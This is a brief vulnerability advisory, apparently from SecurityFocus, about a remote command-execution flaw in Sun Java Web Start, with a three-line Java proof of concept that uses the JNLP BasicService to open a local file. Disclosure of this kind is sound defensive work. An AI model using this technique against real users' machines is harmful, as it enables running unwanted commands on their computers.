source: http://www.securityfocus.com/bid/31916/info

Sun Java Web Start is prone to a remote command-execution vulnerability.

Successful exploits may allow attackers to execute arbitrary commands on an unsuspecting user's computer. This may aid in further attacks.

We don't know which versions of Java Web Start are affected. We will update this BID when more information is released. 

BasicService basicService = (BasicService)    ServiceManager.lookup("javax.jnlp.BasicService");

URL mike = new URL("file:\\C:\\music.rm");

basicService.showDocument(mike);
